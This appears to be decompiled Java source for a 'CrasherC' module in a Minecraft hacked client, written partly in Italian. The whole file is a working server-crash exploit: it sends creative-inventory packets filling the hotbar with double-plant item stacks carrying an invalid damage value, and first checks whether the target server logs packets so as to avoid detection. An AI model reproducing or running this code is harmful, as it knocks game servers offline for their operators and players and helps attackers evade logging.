/*
 * Decompiled with CFR 0_118.
 */
package it.nobusware.client.mods.crashers;

import java.util.Objects;

import it.nobusware.client.manager.Module;
import it.nobusware.client.mods.FindPacketLog;
import it.nobusware.client.utils.ChatUtils;
import net.minecraft.client.main.Main;
import net.minecraft.init.Blocks;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;

public class CrasherC extends Module {

	public CrasherC(String nome_mod, int tasto, String nome_array_printed, Category categoria) {
		super(nome_mod, tasto, nome_array_printed, categoria);
		setDangerous(true);
	}

	public static boolean active;
	int loop;

	@Override
	public void Abilitato() {
		if(FindPacketLog.packetlog.contains(mc.getCurrentServerData().serverIP)) {
			ChatUtils.print("Questo Server Packetlogga!");
			this.toggle();
		}
		active = true;
		ChatUtils.print("Trying to crash with method C ( creative )");
		ChatUtils.print("Make sure you are in creative");
		ItemStack plant = new ItemStack(Blocks.double_plant);
		plant.stackSize = 64;
		plant.setItemDamage(69);
		int index = 0;
		while (index < 9) {
			ItemStack is = CrasherC.mc.thePlayer.inventory.getStackInSlot(index);
			if (Objects.nonNull(is) && Item.getIdFromItem(is.getItem()) == 175 && is.getItemDamage() == 1337
					&& is.stackSize != 64) {
				CrasherC.mc.thePlayer.sendQueue.addToSendQueue(
						new C10PacketCreativeInventoryAction(CrasherC.mc.thePlayer.inventory.currentItem + 36, plant));
				CrasherC.mc.thePlayer.inventory.setInventorySlotContents(CrasherC.mc.thePlayer.inventory.currentItem,
						plant);
			}
			++index;
		}
		if (Objects.isNull(CrasherC.mc.thePlayer.getHeldItem())) {
			CrasherC.mc.thePlayer.sendQueue.addToSendQueue(
					new C10PacketCreativeInventoryAction(CrasherC.mc.thePlayer.inventory.currentItem + 36, plant));
			CrasherC.mc.thePlayer.inventory.setInventorySlotContents(CrasherC.mc.thePlayer.inventory.currentItem,
					plant);
		}
		index = 0;
		while (index < 9) {
			if (Objects.isNull(CrasherC.mc.thePlayer.inventory.getStackInSlot(index))
					|| Item.getIdFromItem(CrasherC.mc.thePlayer.inventory.getStackInSlot(index).getItem()) == 0) {
				CrasherC.mc.thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(index + 36, plant));
			}
			++index;
		}
		CrasherC.mc.thePlayer.sendQueue.addToSendQueue(
				new C10PacketCreativeInventoryAction(CrasherC.mc.thePlayer.inventory.currentItem + 36, plant));
	}

	@Override
	public void Disabilitato() {
		active = false;
	}
}